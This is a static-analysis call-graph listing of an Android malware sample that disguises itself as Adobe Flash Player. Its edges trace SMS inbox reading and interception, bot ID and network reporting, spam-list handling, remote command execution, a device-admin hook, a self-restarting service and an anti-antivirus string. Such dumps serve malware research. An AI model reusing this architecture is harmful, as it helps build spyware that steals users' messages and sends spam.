VIRTUAL edge: $r1 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer.Certificate: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r10) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r19) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r22) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r1.<android.content.Intent: void <init>(android.content.Context,java.lang.Class)>(r0, class "Lcom/adobe/flashplayer_/AdobeFlashCore;") in <com.adobe.flashplayer_.AdobeFlashCore: void onDestroy()> ==> <android.content.Intent: void <init>(android.content.Context,java.lang.Class)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r41) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r30 = staticinvoke <android.net.Uri: android.net.Uri parse(java.lang.String)>("content://sms/inbox") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.net.Uri: android.net.Uri parse(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("c", "1234567890", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r25 = virtualinvoke $r21.<com.adobe.flashplayer_.FlashVars: android.os.AsyncTask execute(java.lang.Object[])>($r22) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r2.<java.io.BufferedReader: java.lang.String readLine()>() in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)> ==> <java.io.BufferedReader: java.lang.String readLine()>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void execMod(java.lang.String,android.content.Context)>($r20, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void execMod(java.lang.String,android.content.Context)>
VIRTUAL edge: $r2 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>(r4, "spamlist.txt", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>
STATIC edge: $r21 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r3 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: java.lang.Object getSystemService(java.lang.String)>("phone") in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <android.content.ContextWrapper: java.lang.Object getSystemService(java.lang.String)>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void close()>() in <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void close()>
VIRTUAL edge: $r2 = virtualinvoke r0.<com.adobe.flashplayer_.ADOBEcoreZa: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.ADOBEcoreZa: java.lang.CharSequence onDisableRequested(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.ADOBEcoreZa: android.content.Intent getIntent()>
STATIC edge: $r2 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("Hello, fuckin AVs!") in <com.adobe.flashplayer_.MacrosStat: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r2.<com.adobe.flashplayer.Certificate$1: void onClick(android.view.View)>($r1) in <dummyMainClass: com.adobe.flashplayer.Certificate dummyMainMethod_com_adobe_flashplayer_Certificate(android.content.Intent)> ==> <com.adobe.flashplayer.Certificate$1: void onClick(android.view.View)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $r6 = virtualinvoke $r7.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r1 = virtualinvoke r4.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r4.<java.io.InputStreamReader: void <init>(java.io.InputStream)>($r6) in <com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.InputStreamReader: void <init>(java.io.InputStream)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Long: java.lang.Long valueOf(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, "getProcesses:Executed:HTTP", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r8) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("?") in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("+") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r6.<java.lang.String: boolean contains(java.lang.CharSequence)>("by") in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
SPECIAL edge: specialinvoke r3.<java.io.BufferedReader: void <init>(java.io.Reader)>(r4) in <com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: void <init>(java.io.Reader)>
SPECIAL edge: specialinvoke r0.<android.app.Activity: void onCreate(android.os.Bundle)>($r1) in <com.adobe.flashplayer_.FlashARM: void onCreate(android.os.Bundle)> ==> <android.app.Activity: void onCreate(android.os.Bundle)>
SPECIAL edge: specialinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke r3.<java.io.BufferedReader: java.lang.String readLine()>() in <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: java.lang.String readLine()>
STATIC edge: r27 = staticinvoke <android.net.Uri: android.net.Uri parse(java.lang.String)>("content://sms/inbox") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.net.Uri: android.net.Uri parse(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r11) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, r19, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r4 = virtualinvoke $r6.<com.adobe.flashplayer.Certificate: android.content.Context getApplicationContext()>() in <com.adobe.flashplayer.Certificate$2: void onClick(android.view.View)> ==> <android.content.ContextWrapper: android.content.Context getApplicationContext()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r16) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r10 = specialinvoke r0.<com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotID", $r1) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r22) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
STATIC edge: r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<android.app.Service: void onCreate()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.app.Service: void onCreate()>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.Service: void onDestroy()>() in <com.adobe.flashplayer_.MacrosStat: void onDestroy()> ==> <android.app.Service: void onDestroy()>
VIRTUAL edge: $r11 = virtualinvoke $r11.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("+", "") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: virtualinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r27) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r7 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotNetwork") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void close()>() in <com.adobe.flashplayer_.FlashW: void writeConfig(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void close()>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: android.content.ComponentName startService(android.content.Intent)>($r1) in <com.adobe.flashplayer_.AdobeFlashCore: void onDestroy()> ==> <android.content.ContextWrapper: android.content.ComponentName startService(android.content.Intent)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("MacrosAState", "B", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("sdcard/") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
STATIC edge: r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r8) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r12) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r3.<java.io.BufferedReader: void <init>(java.io.Reader)>(r4) in <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: void <init>(java.io.Reader)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r20 = virtualinvoke $r15.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r30 = staticinvoke <android.os.Environment: java.lang.String getExternalStorageState()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.Environment: java.lang.String getExternalStorageState()>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r24.<java.lang.String: int indexOf(java.lang.String)>("stop") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke r0.<com.adobe.flashplayer_.FlashY: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashY: android.content.Intent getIntent()>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r8) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r4.<java.io.InputStreamReader: void <init>(java.io.InputStream)>($r6) in <com.adobe.flashplayer_.adobeCore: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.InputStreamReader: void <init>(java.io.InputStream)>
SPECIAL edge: specialinvoke r0.<android.os.CountDownTimer: void <init>(long,long)>($l0, $l1) in <com.adobe.flashplayer_.AdobeUtil$1: void <init>(com.adobe.flashplayer_.AdobeUtil,long,long)> ==> <android.os.CountDownTimer: void <init>(long,long)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("Visits: ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashURL: void abortBroadcast()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.BroadcastReceiver: void abortBroadcast()>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r7) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, "loadSpam[OK]:Executed:HTTP", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r16) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.packages.BK dummyMainMethod_com_adobe_packages_BK(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.packages.BK dummyMainMethod_com_adobe_packages_BK(android.content.Intent)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r16 = staticinvoke <android.telephony.SmsMessage: android.telephony.SmsMessage createFromPdu(byte[])>($r15) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.telephony.SmsMessage: android.telephony.SmsMessage createFromPdu(byte[])>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("macros") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("execMod[") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
STATIC edge: $r2 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r2) in <com.adobe.flashplayer_.MacrosStat: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r20 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
